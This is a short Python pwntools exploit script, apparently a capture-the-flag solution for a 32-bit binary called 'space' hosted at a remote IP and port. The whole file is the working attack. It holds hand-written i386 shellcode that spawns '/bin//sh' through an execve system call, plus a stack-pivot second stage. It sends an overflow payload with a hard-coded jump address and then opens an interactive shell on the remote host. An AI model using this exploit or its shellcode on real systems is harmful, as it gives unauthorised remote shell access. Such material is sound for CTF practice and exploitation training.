#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./space')
context.arch = 'i386'
#p = process()

p = remote('94.237.62.166',55037)
#gdb.attach(p,gdbscript='''
#           b*0x80491ce
#           b*0x80491c1
#           ''')
#input()
call_eax = 0x08049019

###shellcode nay khong thanh cong do ecx,edx kh NULL
#shellcode = asm('''

#    push 0x0b
#    pop eax
#    push 0x68732f2f
#    push 0x6e69622f
#    mov ebx, esp
#    int 0x80
#    ''',arch = 'i386')

shellcode_1 = asm('''
                  push eax
                  push 0x68732f2f
                  push 0x6e69622f
                  mov ebx,esp
                  mov al, 0xb 
                  int 0x80 
                  ''')
shellcode_2 = asm('''
                  xor edx,edx
                  xor eax,eax

                  sub esp,0x16
                  jmp esp
                  ''')
p1 = flat([
    b'\x90',
    shellcode_1,
    0x0804919f,
    shellcode_2
])
p.sendlineafter(b'>',p1)

p.interactive()
